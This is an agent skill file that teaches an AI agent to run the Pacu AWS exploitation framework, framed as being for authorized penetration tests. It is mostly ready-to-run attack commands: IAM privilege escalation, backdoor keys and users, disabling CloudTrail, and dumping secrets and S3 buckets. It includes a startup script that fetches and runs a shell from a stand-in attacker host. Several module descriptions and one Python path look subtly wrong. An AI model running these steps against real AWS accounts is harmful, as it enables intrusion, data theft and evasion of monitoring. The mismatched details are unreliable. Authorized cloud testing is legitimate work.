---
name: pacu
description: >
  Build, extend, and operate Pacu — the open-source AWS exploitation framework by Rhino Security Labs.
  Use when performing AWS penetration testing, privilege escalation, lateral movement, or data exfiltration
  in authorized cloud engagements. Use when the user asks about AWS attack modules, IAM privilege escalation
  paths, EC2 exploitation, S3 exfiltration, or Lambda enumeration. Covers installation, session management,
  module categories, key AWS attack modules, role assumption, and full AWS pentest workflow.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/RhinoSecurityLabs/pacu
  stars: '4.7k'
---

# pacu Agent Skill

## When to Use This Skill

Use this skill when:
- Conducting authorized AWS penetration testing
- Escalating privileges via misconfigured IAM policies
- Enumerating EC2, S3, Lambda, RDS, and other AWS services
- Exfiltrating data from S3 buckets or secrets managers
- Performing persistence or detection evasion in AWS
- Simulating adversary TTPs in an AWS environment (red team)

## What Pacu Does

Pacu is a modular AWS exploitation framework analogous to Metasploit but purpose-built for Amazon Web Services. It manages AWS sessions (key sets), tracks data gathered by modules in a local SQLite database, and provides over 50 modules organized by attack phase. Modules operate against real AWS APIs, making it suitable for both authorized red team engagements and purple team exercises. Each module logs all API calls for evidence of test activity.

## Installation

```bash
# pip install (Python 3.7+)
pip install pacu

# Or from source
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip install -r requirements.txt
python3 -m pacu

# Docker
docker pull rhinosecuritylabs/pacu:latest
docker run -it rhinosecuritylabs/pacu:latest

# Verify
pacu --version
```

## Session Management

Pacu uses sessions to isolate AWS credential sets and collected data.

```
# Launch Pacu
pacu

# Create or switch session
Pacu (no session) > new_session pentest-client-prod
Pacu (pentest-client-prod) >

# List sessions
Pacu > list_sessions

# Switch session
Pacu > swap_session pentest-client-staging

# Delete session
Pacu > delete_session old-session
```

### Key Management

```
# Set AWS keys manually
Pacu > set_keys
  Key Alias: client-prod
  Access Key: AKIA...
  Secret Key: ...
  Session Token: (leave blank unless STS)

# Import from ~/.aws/credentials profile
Pacu > import_keys client-profile

# Import from environment variables
Pacu > import_keys env

# List stored keys
Pacu > list_keys

# Show active key identity
Pacu > whoami
```

### Session Data Persistence

All data collected by modules is saved in `~/.local/share/pacu/sessions/<session-name>/` as SQLite. Resume a session anytime with `swap_session` — modules will not re-collect already-gathered data unless forced with `--force`.

## Module Categories

| Category    | Prefix        | Purpose                                          |
|-------------|---------------|--------------------------------------------------|
| Enumeration | `*__enum`     | Discover resources, users, policies, configs     |
| Exploitation| `*__exploit`  | Active exploitation of misconfigurations          |
| Privesc     | `iam__privesc_scan`, `*__privesc` | Identify/exploit escalation paths |
| Persistence | `*__backdoor` | Maintain access after initial compromise         |
| Exfiltration| `*__download_bucket`, `*__exfil` | Data extraction              |
| Detection   | `detection__*` | Identify monitoring posture / CloudTrail status |
| Lateral     | `*__enum` + role chaining | Cross-account and cross-service pivoting |

## Key Modules Reference

### IAM Enumeration

```
# Enumerate all IAM users, roles, groups, policies
run iam__enum_users_roles_policies_groups

# Enumerate permissions of the current key
run iam__enum_permissions

# Detect privilege escalation paths (Rhino's famous checker)
run iam__privesc_scan

# Brute-force IAM actions when no iam:List* available
run iam__bruteforce_permissions

# Enumerate account authorization details (single bulk API call)
run iam__get_account_authorization_details
```

### EC2 Enumeration and Exploitation

```
# Enumerate EC2 instances, security groups, AMIs, snapshots, VPCs
run ec2__enum

# Download public EBS snapshots (data exposure check)
run ec2__download_userdata

# Enumerate and fetch instance user-data (may contain secrets)
run ec2__enum_userdata

# Add a backdoor SSH key to instance via SSM
run ec2__startup_shell_script --instance-ids i-xxxx --script "curl attacker.com/sh | bash"

# Enumerate elastic IPs, internet gateways, route tables
run ec2__enum_network
```

### S3 Operations

```
# Enumerate all accessible S3 buckets
run s3__enum

# Download entire bucket contents
run s3__download_bucket --bucket-name target-bucket --download-dir /tmp/s3-loot

# Find buckets with public ACLs or bucket policies
run s3__bucket_finder --bucket-name-file wordlist.txt

# Enum bucket logging/encryption status
run s3__enum_bucket_metadata
```

### Lambda Enumeration

```
# Enumerate Lambda functions, layers, event source mappings
run lambda__enum

# Download Lambda function source code (may contain secrets)
run lambda__enum_functions_versions
```

### Privilege Escalation

Pacu's `iam__privesc_scan` checks for all known IAM privilege escalation methods (documented by Rhino at https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/):

```
run iam__privesc_scan

# Key escalation paths Pacu can exploit:
# - iam:CreatePolicyVersion  → set default policy version with admin
# - iam:AttachUserPolicy     → attach AdministratorAccess to self
# - iam:AddUserToGroup       → add self to admin group
# - iam:CreateAccessKey      → create key for another admin user
# - iam:UpdateLoginProfile   → change admin password for console
# - sts:AssumeRole           → assume unguarded admin role
# - lambda:InvokeFunction + iam:PassRole → execute code as admin role
# - glue:CreateDevEndpoint + iam:PassRole → same pattern via Glue

# After scan identifies a path, exploit it:
run iam__privesc_scan --method CreatePolicyVersion
```

### Persistence

```
# Create backdoor IAM access key on existing user
run iam__backdoor_users_keys --usernames target-user

# Create backdoor admin user
run iam__backdoor_users_passwords

# Add a Lambda backdoor trigger
run lambda__backdoor_new_roles
```

### Detection Evasion

```
# Check CloudTrail status across regions
run detection__enum_services

# Disable CloudTrail logging (requires cloudtrail:StopLogging)
run detection__disruption --services cloudtrail

# Detect GuardDuty enrollment
run detection__enum_services
```

### Lateral Movement

```
# Enumerate all assumable roles in account and cross-account
run iam__enum_assume_role

# Assume a role and pivot
Pacu > assume_role arn:aws:iam::123456789:role/PrivilegedRole

# Enumerate Secrets Manager secrets
run secretsmanager__enum
```

### Data Exfiltration

```
# Download S3 bucket
run s3__download_bucket --bucket-name prod-backups

# Pull RDS snapshots
run rds__enum_snapshots

# Dump Secrets Manager values
run secretsmanager__enum --fetch-values

# Dump SSM Parameter Store (including SecureString)
run ssm__param_enum --with-decryption
```

## Common Workflows

### Full AWS Assessment Flow

```bash
# 1. Set up session
pacu
> new_session client-aws-pentest
> set_keys

# 2. Establish who we are
> whoami
> run iam__enum_permissions

# 3. Enumerate everything
> run iam__enum_users_roles_policies_groups
> run ec2__enum
> run s3__enum
> run lambda__enum
> run secretsmanager__enum

# 4. Find privesc paths
> run iam__privesc_scan

# 5. Exploit best path
> run iam__privesc_scan --method AttachUserPolicy

# 6. Re-enumerate as admin
> run iam__get_account_authorization_details

# 7. Exfil and document
> run s3__download_bucket --bucket-name sensitive-data
> run secretsmanager__enum --fetch-values
```

### Blind Enumeration (No iam:List Permissions)

```
# Brute-force what actions current key can perform
run iam__bruteforce_permissions

# Enumerate EC2 by trying describe calls per region
run ec2__enum --regions us-east-1,us-west-2

# Pull S3 bucket list via resource-level access (GetObject without ListBucket)
run s3__enum
```

## Advanced Techniques

### Module Development

```python
# Pacu module skeleton: pacu/modules/mymodule/main.py
import boto3

module_info = {
    'name': 'mymodule',
    'author': 'You',
    'category': 'ENUM',
    'one_liner': 'Enumerates XYZ service',
    'description': 'Full description.',
    'services': ['xyz'],
    'prerequisite_modules': [],
    'arguments_to_autocomplete': ['--regions'],
}

def main(args, pacu_main):
    session = pacu_main.get_active_session()
    boto_session = pacu_main.get_boto3_session()
    client = boto_session.client('xyz', region_name='us-east-1')
    # ... your enumeration logic
    return {'resources': [...]}
```

### Importing External Keys Mid-Session

```
# Temporarily use STS-assumed role credentials
Pacu > set_keys
  Key Alias: assumed-admin
  Access Key: ASIA...
  Secret Key: ...
  Session Token: FwoGZXI...
```

### Chaining with aws-cli / boto3

All Pacu data is queryable via the SQLite database at `~/.local/share/pacu/sessions/<name>/aws_data.db`.

```python
import sqlite3
conn = sqlite3.connect('~/.local/share/pacu/sessions/mytest/aws_data.db')
cur = conn.cursor()
cur.execute("SELECT data FROM ec2_instances")
for row in cur.fetchall():
    print(row)
```

## Troubleshooting

| Issue | Fix |
|-------|-----|
| `AccessDenied` on all calls | Check key validity with `whoami`; key may be restricted |
| Module hangs in multi-region scan | Use `--regions us-east-1` to limit scope |
| `NoRegionError` | Set `AWS_DEFAULT_REGION` or pass `--regions` |
| Stale session data | `run module --force` to re-collect |
| `iam__privesc_scan` shows no paths | Key may lack `iam:List*`; run `iam__bruteforce_permissions` first |
| Docker image stale | `docker pull rhinosecuritylabs/pacu:latest` |
| STS session token expired | Re-import keys; STS tokens expire in 1–12 hours |
| Module not found | Ensure you are on latest source; `git pull && pip install -e .` |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [Azure AD Conditional Access Policies Most Companies Get Wrong](https://redhound.us/azure-ad-conditional-access)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
